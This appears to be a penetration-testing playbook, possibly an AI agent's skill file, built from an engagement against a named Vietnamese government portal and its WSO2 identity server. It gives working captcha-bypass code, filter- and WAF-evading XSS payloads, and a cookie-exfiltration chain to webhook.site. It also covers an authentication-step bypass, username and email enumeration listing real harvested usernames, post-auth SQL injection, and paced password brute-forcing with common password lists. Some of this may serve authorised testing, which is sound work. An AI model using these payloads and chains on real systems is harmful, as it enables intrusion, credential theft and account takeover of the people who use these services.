# Client-Side Captcha Bypass, Modern-Event XSS Bypass, and WSO2 IS Surface

Class-level patterns from the dongnai.gov.vn engagement (Oct 2026): a Java reporting app with a client-side hash captcha, an F5-ASM-fronted WSO2 Identity Server 7.2 SSO, and a server-side XSS sanitizer built on an on*-event blocklist.

---

## §1. jquery.realperson-style captcha = deterministic bypass

### Symptom

Login page loads `jquery.realperson.js` (or a similar client-side captcha plugin). The "captcha" is drawn in the browser from a randomly generated string, and a hidden field (`defaultRealHash` / `{name}Hash`) is computed **client-side** on form submit.

### Root cause

Server validation is only:

```
defaultRealHash == hash(typed_text + salt)
```

There is NO server-side challenge record — the "correct" answer is whatever the client computes. The hash function is a public JS 32-bit rolling hash (seed 1324: `((h<<5)+h)+c`); salt comes from a `#salt` element (often empty string).

### Bypass

1. Read the plugin JS to get the exact hash function, submitted field names (`defaultReal`, `defaultRealHash`), and the csrf salt field.
2. Compute the hash offline for ANY text — must emulate JS 32-bit signed overflow.
3. Submit arbitrary creds with a matching `defaultReal` / `defaultRealHash` pair.

```python
def to_i32(x):
    x &= 0xFFFFFFFF
    return x - (1 << 32) if x >= (1 << 31) else x
def rp_hash(v):          # jquery.realperson algorithm
    h = 1324
    for ch in v:
        h = to_i32(to_i32(h << 5) + h + ord(ch))
    return to_i32(h)
# submit: defaultReal="QW3RTY", defaultRealHash=str(rp_hash("QW3RTY"))
```

### Verification oracle

Distinguish responses via the app's error codes: with a correct bypass you get the *credential* error (e.g. `invalid=1` = wrong password); without it you get the captcha error (`invalid=3` = wrong captcha). Reproduce with two independent tools (curl + requests) per the multi-tool reproduction bar in bb-methodology.

### Generalization

ANY captcha whose server-side check is computable from client-visible data (client-side hash, puzzle answer echoed back, static salt in page source) is bypassable. The decisive question: does the server remember a challenge it generated? If the plugin only submits a hash of user-typed text, it does not.

### Pair with account-lockout caution

Lockout counters may exist — the page's JS error map often reveals them (`remaining attempts`, `account locked` messages). Cap attempts per username (≤4), rotate usernames, and never drive a real account into lockout. Collateral-impact rules apply.

---

## §2. XSS sanitizer built on an on*-event blocklist — modern-event bypass

### Symptom

Server reflects input RAW into HTML (verify with a canary `<p id=...>`), but any payload containing `alert(`, `eval(`, `javascript:`, `<script`, `<iframe`, or `on<known-event>=` gets the whole request **rejected** (page replaced with a generic error, not the value stripped).

### Blocklist mapping procedure

Send single tokens as the full parameter value and record PASS/REJECT:
- All ~58 known DOM handlers (`onerror=`, `onload=`, `ontoggle=`, ...) → REJECT
- `alert` alone passes; `alert(` blocks; `al"+"ert(1)` concatenation blocks too (the filter normalizes quotes/plus and decodes `\uXXXX` multi-pass — escape-splitting of `alert` does not survive)
- `<audio src=x>`, `<div>`, `<template>` pass bare, but the same tags with any event handler or `javascript:`/`data:` URL block

### Bypass: use events NOT in the blocklist

Modern/obscure DOM events pass the filter and are real handlers:
- `oncontentvisibilityautostatechange` — fires when a `content-visibility:auto` element enters/leaves the viewport
- `onbeforematch` — fires when a `hidden=until-found` element is revealed via find-in-page (needs user Ctrl+F)

### Auto-fire with zero interaction

```html
<div style="position:fixed;top:-9999px;content-visibility:auto"
     oncontentvisibilityautostatechange=import("//C2/x.js")>x</div>
```

Off-screen + `content-visibility:auto` makes the browser fire the event during initial layout. Verified in a real browser: handler attached, event fired, remote module import attempted (visible in `performance.getEntriesByType('resource')`).

Visible PoC without a C2 (for screenshots): `document.title='PWNED';document.bgColor='red'` — both typically pass the filter.

### Execution helpers that typically pass such filters

PASS: `document.title=`, `document.bgColor=`, `location=`, `location=name`, `import("//host/x.js")`, `Function(`, `import(`.
BLOCKED: `document.write(`, `innerHTML=`, `window.`, `this.x`, `alert(`, `eval(`, `fetch(`, `open()`, `confirm(`, `prompt(`.

### The encoded-output false-positive trap

If a reflection shows what LOOKS like tags (`<h1>12</h1>` visible on the page), verify before claiming XSS: it may be `<h1>` rendered as text. Check `element.innerHTML` / `element.children.length` in the browser, or search the raw response body for the unencoded string. When reporting to the user, state explicitly: "what you see as <> is < rendered — not a real tag" to preempt repeated retest requests.

---

## §3. WSO2 Identity Server (7.x) attack surface map

> CVE-mapping discipline (from the same engagement): when the user asks "which CVE is
> this?", query NVD for the product + version and the vuln CLASS. "SP doesn't enforce
> 2FA" → misconfiguration (CWE-306/CWE-1188), no CVE exists. "XSS in login flow" on
> IS 7.2.0 → cite CVE-2024-7103 (same class, IS 7.0.0) as prior art your finding
> generalizes past. Never assign a CVE to a config issue; never claim an affected CVE
> whose fixed-version range includes your target.

### Core endpoints and shapes

- `/oauth2/authorize` → 302 `/authenticationendpoint/login.do?...&sessionDataKey=<uuid>`
- `POST /commonauth` — the central auth POST. Minimal working body: `username`, `password`, `sessionDataKey`, `usernameUserInput`. Success → 302 `/t/{tenant}/oauth2/authorize?sessionDataKey=...` → 302 `redirect_uri?code=...`
- `/oauth2/token` — authorization_code + code_verifier (PKCE) exchange

### XSS surface (per-endpoint encoding varies — test EACH)

- `login.do` — the **`authenticators` param is reflected RAW into the authenticator button HTML** → attribute breakout with `BasicAuthenticator:LOCAL;"> <payload>:LOCAL` style → reflected XSS on the IdP domain, reached during live login flow
- `util/modal.jsp` — `title` + `description` params reflected raw into `<b>`/`<p>`
- `email_otp.do` — `screenValue` is HTML-encoded (safe); `sessionDataKey` strips quotes (safe)

### sessionDataKey is SINGLE-USE

A URL shared for testing returns 404 / `oauth2_error.do?oauthErrorCode=invalid_callback` on second use. To retest, mint a fresh one via the authorize flow. For `client_id=CONSOLE`, PKCE S256 is mandatory — build `code_challenge=base64url(sha256(verifier))`.

### Scope entitlement oracle

Request `internal_user_mgt_*` scopes on authorize — the server silently strips scopes the user is not entitled to (compare `scope` in the token response). This tells you the user's privilege level without any admin API call.

### Recon from the user-portal proxy

The portal SPA exposes a Spring proxy: `GET /user-portal/api/oauth2/authorize?redirect_uri=...` (400 without the param, 302 with) reveals the portal client_id and its full requested scope set (`internal_user_mgt_create/delete/update/list/...`) in the Location header — unauthenticated recon of what the admin portal can do. Note: on multi-host deployments the proxy may live on a different hostname (e.g. `dangnhap.*` vs `sso.*`) — try both.

### Authenticated testing chain

With valid creds: authorize (mint sessionDataKey) → GET login.do → POST /commonauth → follow 302s to code → POST /oauth2/token. Then test `/api/server/v1/*` (admin), `/scim2/Me`, `/api/identity/user/v1.0/me` (self-service) with the Bearer token. SP-level authorization may block even valid users on specific apps (`login.fail` on portal while console succeeds) — test per-SP. Self-registered test users typically have only `Internal/selfsignup` + `Internal/everyone` roles and get 403 across the board.

### Email OTP reality check

EmailOTP is only reachable AFTER a successful username+password POST for an existing user. Forcing `authenticators=EmailOTP` in the URL does NOT trigger OTP for nonexistent users, and there is no passwordless OTP trigger. OTP verify = `POST /commonauth {OTPCode, sessionDataKey, authenticate}`; failure lands on `/authenticationendpoint/retry.do` with a generic message (no error oracle). If no valid account or OTP-enabled SP is available, OTP brute-force is simply not reachable — state that plainly instead of hammering the endpoint.

---

## §5. Reset-code numeric oracle — user AND email enumeration in one endpoint

An error-code-driven reset endpoint (`?invalid=N` redirect) is a two-axis oracle. Decode the
full table from the page's inline JS `_param == N` mapping — the JS comments often retain the
ORIGINAL (pre-genericized) messages, which reveal exactly which backend state each code means:

```
-1  = username does not exist
-2  = username EXISTS, email mismatch          → username enumeration
-3  = EMAIL exists in system (username not)    → email enumeration
-10 = both username and email exist, not linked
 1 / 2 / 69 = reset code sent OK
 3 = wrong/expired code   4 = too many code requests   -6 = code generation failed
```

Differential decoding procedure (3 probes/user):
1. `user + definitely-fake@x.local` → `-1` (no user) vs `-2` (user exists)
2. known-missing user + candidate email → `-3` = the EMAIL itself is registered
3. existing user + candidate email → `-10` (both real, unlinked) vs `1/2/69` (MATCH)

Verified on HTTTBC (baocao.dongnai.gov.vn `/ioc/servlet/login.ResetPassword`): recovered
19+ usernames (`admin, administrator, ioc, baocao, tonghop, vanphong, test1/2/4/5/20/22,
xa1, huyen1-2, tinh1-5, donvi2, anhthu`) and confirmed test accounts used personal gmail
(`test{n}@gmail.com` exists in system, `-3`), not the gov domain.

Pacing on WAF-fronted targets: slow sequential (~0.4–0.6s pacing, fresh session per request)
ran 30+ requests with zero blocks; 12–15-thread parallelism triggered F5 IP-flood blocking
within a single batch. Use paced sequential enumeration.

---

## §6. Legacy Java JSON-RPC dispatcher = post-auth SQLi funnel

Old Java servlet apps frequently expose ONE generic AJAX dispatcher:
`POST /<ctx>/RestService?func=<fn>` with body
`{"func":"<fn>","fcode":"","uuid":"","params":[...],"options":[]}`.

- Schema recovery: read the app's client libs (`jsonrpc.js`, `UIUtil.js`) — grep for
  `func`, `params`, `RSUtil.encode`, `RestInfo.base_url`. `params` carries **raw SQL
  strings** for grid/combo functions (`ajaxExecuteQueryPaging`, `ajaxExecuteQuery`,
  `dbExecuteQuery`, `ajaxCALL_SP_O`); `RSUtil.encode` is only JSON escaping, not crypto.
- Enumeration by error shape: POST with `{"params":[...]}` shapes and watch for
  `java.util.NoSuchElementException: JSONObject["params"]` (body parsed) vs
  `NullPointerException` (unknown func). Auth-gated apps return a domain code like
  `error_code=2, "Lỗi chưa đăng nhập"` — that is post-auth SQLi waiting on any single
  valid account, not a dead end.
- WAF note: F5 ASM blocks the `?func=..&postData=..` GET-query form but misses the same
  payload in the POST body.

---

## §7. Lockout-dead and brute-force pacing

### Lockout that exists only in the UI

The login JS error map may contain handlers for fail-counter and lockout states (e.g.
`invalid=9` "X attempts remaining", `invalid=10` "account locked"). Handlers present ≠
enforcement on. Verification: N consecutive wrong passwords on a REAL user where N exceeds
every plausible threshold and every response is still the plain wrong-credential code →
lockout enforcement is off. That is a standalone finding and the enabler for unbounded
credential stuffing (combined with captcha bypass + enumeration = full chain).

### Collateral discipline when the oracle is blind

If the endpoint gives the same code for "user not exist" and "wrong password", you cannot
distinguish lockout from bad guesses. Cap real accounts at ~4 fails, stop at any unexpected
code, and tell the user plainly that the account may now be locked (lockout-DoS of a real
gov account is itself a finding and a harm). Do not keep hammering to "confirm" — the
confirmation is the harm.

### Password brute against the bypassed captcha

Pacing: ~0.5–2s between attempts, fresh session each time (WAF flood-detection keys on
parallel bursts). Common-gov password lists (DongNai@123, Admin@123, Abc@123@, P@ssw0rd123)
are the first pass; expect misses on admin-set passwords but hits on user-chosen ones.

---

## §4. F5 ASM recognition (cont.)

Block page fingerprint: `<html><head><title>Request Rejected</title></head>` + `Support ID: <number>` + sponsoring-org footer. Distinguish ASM blocks (200 status + small fixed page, e.g. 246 B / 2.2 KB) from app responses by page fingerprint, not status code.

ASM inspects URL paths aggressively — blocks `../`, `%2e%2e`, `..%c0%af` in path AND query on sensitive servlets — but is historically weaker on POST bodies: retest path-blocked payloads in POST bodies before giving up.

---

## §8. Two-layer exfiltration bypass (app sanitizer + F5 ASM) — working chain

When the app-side on*-blocklist passes your event but F5 ASM rejects the request at the
network layer, keyword-level constraints stack. ASM keywords verified blocked as substrings
anywhere in the request: `document.cookie`, `fetch(`, `eval(`, `Function(`, `atob(`,
`<form`, `setTimeout(`, and any ≥20-char base64 literal (the decoder heuristic).

### Working exfil chain (all layers passed, verified end-to-end in browser)

```
location="//webhook.site/<token>?c=" + document["coo"+"kie"]
```

- `document["coo"+"kie"]` — bracket notation + string concat defeats the `document.cookie`
  keyword check (single keyword scan does not reassemble split strings)
- `//host/...` protocol-relative URL avoids scheme literals that trip other rules
- `location=` navigation replaces `fetch(` — the browser performs the request and the
  exfil lands as a normal GET with all data in the query string
- `encodeURIComponent(document.URL)` passes and captures the full original URL including
  the sessionDataKey

Verified result: webhook received `?c=TS0195e8b2=...;TS018fea38=...` (all non-HttpOnly
cookies) fired automatically with zero interaction.

### HttpOnly nuance worth stating in reports

`document.cookie` cannot read HttpOnly cookies (`commonAuthId`, `JSESSIONID`) — that is
correct standard protection, not a test failure. BUT any same-origin
`fetch(url, {credentials:'include'})` from the XSS still SENDS those cookies and the
response body is JS-readable — so authenticated API responses are exfiltrable even when
the cookie values are not. Distinguish "cookie value theft" from "authenticated action
theft" when reporting impact.

### Exfil vector comparison

| Vector | Passes app filter | Passes ASM | Notes |
|---|---|---|---|
| `fetch(url)` | ✅ | ❌ (`fetch(` keyword) | — |
| `eval(atob(...))` | ✅ | ❌ | — |
| `location="https://..."` | ✅ | ✅ | scheme literal fine here |
| `location="//..."` + split cookie | ✅ | ✅ | **the chain** |

---

## §9. Compact attribute injection (quote-free event values)

A server template that splits rendered values on spaces (e.g. WSO2 renders the
`authenticators` value into a `data-testid='...'` attribute) turns a spaced payload into
separate orphaned attributes and the handler silently dies. The compact form that survives
both the template and the app filter:

```
<p id=canary style=content-visibility&#58auto oncontentvisibilityautostatechange=<JS>>
```

- `&#58;` for the `:` inside `style` — avoids colon-encoding normalization
- Event value is a single expression; quotes INSIDE the JS expression are fine
  (`document.title='PWNED'`), quotes around the whole attribute value are what breaks
  template parsing

Debug procedure when a filtered-but-passed payload "doesn't run": GET the rendered page,
find your canary text, and read the surrounding HTML — if the tag was split into separate
attributes, rebuild compact; if it was encoded, the endpoint is actually safe.

---

## §10. Reusable PoC generator (scripts/poc_gen.py)

`sessionDataKey` is single-use: every browser load of a hand-built PoC URL consumes it.
The skill ships `scripts/poc_gen.py` — pass a payload string, it runs
authorize → PKCE(S256) → extracts a fresh sessionDataKey → returns the full injectable
login.do URL. Every retest or victim simulation needs a fresh mint; do not share consumed
URLs as evidence (a 404 screenshot of a dead key proves nothing).

---

## §11. CVE-2025-15039 — authentication-flow step bypass via `authenticators` param

The same `authenticators` param that yields XSS also **controls which authenticators the
flow runs**. WSO2 builds the step list from this parameter rather than solely from the SP's
configured template, so an attacker who can edit it can DELETE steps.

### Confirmed exploit (WSO2 IS 7.2.0, CVE-2025-15039 / WSO2-2025-4973, CVSS 9.4)

```
1. GET /oauth2/authorize?client_id=CONSOLE&code_challenge=<PKCE>&... → 302 login.do?sessionDataKey=<SDK>
2. REWRITE authenticators=BasicAuthenticator:LOCAL;FIDOAuthenticator:LOCAL
   → authenticators=FIDOAuthenticator:LOCAL          (delete step 1, keep step 2's authenticator)
3. POST /commonauth {username, password, sessionDataKey}   ← submit PASSWORD anyway
4. → 302 /t/{tenant}/oauth2/authorize?sessionDataKey=...  → 302 redirect_uri?code=...
5. POST /oauth2/token {code, code_verifier} → access_token + id_token
   id_token.amr == ["BasicAuthenticator"]            ← FIDO step skipped, PROOF
```

The decisive artifact is `amr` in the id_token: if you forced `FIDOAuthenticator` but `amr`
contains only `BasicAuthenticator`, the flow accepted a password submission inside a
FIDO-designated flow and issued the code without the challenge.

### Advisory conditions vs what you can verify

The official advisory lists four conditions (secondary authenticator present in the flow;
conditional-auth script with event callback + re-execution; user enrolled in that
authenticator; attacker completes prior steps). You usually cannot read the tenant's
conditional-auth script, so verify what IS observable:
- flow offers Passkey/FIDO/iProov/custom as an option (count `FIDOAuthenticator`,
  `Passkey`, `WebAuthn` occurrences in login.do HTML) — ✅ checkable
- forced-authenticator + password-submit → code issued (the behavior above) — ✅ checkable
- victim enrollment — ❌ NOT checkable for other users. This bounds the finding: with a
  self-registered test account (not enrolled) the code issues anyway, which proves the
  server-side flaw; full ATO of a specific victim additionally requires that victim to be
  enrolled. State both halves separately in the report.

### Full chain with the engagement's other findings

```
XSS login.do (§3) harvests password via form-hijack
  → CVE-2025-15039 skips the FIDO step on the harvested account
    → no-2FA-enforcement default means most SPs never even reach step 2
      → ATO across every SP on the IdP (IOC backend, Console, portal, HTTTBC-via-SSO)
```

Related CVEs to cite when reporting: CVE-2024-7487 (app-native auth bypass, IS 7.0.0 —
fixed in 7.2.0, do NOT claim), CVE-2024-8122 (SMS OTP no expiry — if SMSOTP present),
CVE-2024-7103 (same-class XSS in login flow — cite as prior art that your finding
generalizes past the fix).

---

Engagement source: dongnai.gov.vn (IOC portal + HTTTBC baocao + WSO2 IS 7.2 IdP), October 2026.
